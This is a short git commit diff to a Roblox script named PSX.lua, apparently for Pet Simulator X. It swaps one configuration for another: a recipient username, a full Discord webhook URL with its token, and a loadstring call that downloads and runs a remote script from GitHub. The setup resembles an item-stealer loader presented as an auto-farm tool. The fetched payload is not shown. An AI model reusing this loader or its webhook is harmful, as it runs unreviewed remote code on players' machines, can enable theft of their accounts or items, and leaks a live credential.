0a6422f6091b88ad0ad73cddec1b8e6de85348de
RdimoV2 <109044395+RdimoV2@users.noreply.github.com>
2022-12-19 16:34:04 -0500

    Update PSX.lua

--- PSX.lua
+++ PSX.lua
@@ -1,3 +1,4 @@
-_G.UserID = 3530995605
-_G.WebHook = "https://discord.com/api/webhooks/1053807365000020038/nKQB8AM1z6PZbtaGR8QUoz8KZuxmdAJKbbHq-FoCLogs6tadyWuPa_3_L5D-2bOc9OY7"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua%27))()
+Username = "itsjustanimage"
+Webhook = "https://discord.com/api/webhooks/1053807365000020038/nKQB8AM1z6PZbtaGR8QUoz8KZuxmdAJKbbHq-FoCLogs6tadyWuPa_3_L5D-2bOc9OY7"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
